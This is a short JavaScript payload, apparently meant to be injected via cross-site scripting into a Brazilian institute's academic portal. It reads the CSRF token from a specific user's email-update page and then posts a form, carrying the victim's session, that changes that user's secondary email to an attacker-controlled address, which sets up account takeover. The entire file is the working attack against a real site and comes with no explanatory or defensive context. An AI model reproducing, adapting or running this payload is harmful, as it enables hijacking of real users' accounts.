let EMAIL_ATACANTE = 'primeiro_ato@gmail.com'

fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/")
  .then(function(response){
    return response.text()
  })
  .then(
    function(html){
      let parser = new DOMParser();
      let paginaTrocaEmail = parser.parseFromString(html, "text/html");
      csrftoken=paginaTrocaEmail.querySelector("input[name='csrfmiddlewaretoken']").value;
      fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,pt-BR;q=0.8,pt;q=0.5,en;q=0.3",
          "Content-Type": "application/x-www-form-urlencoded",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-User": "?1"
      },
      "referrer": "https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/",
      "body": "csrfmiddlewaretoken=" + csrftoken + "&email_secundario=" + EMAIL_ATACANTE + "&atualizaremailaluno_form=Aguarde...",
      "method": "POST",
      "mode": "cors"
      });
    }
  );


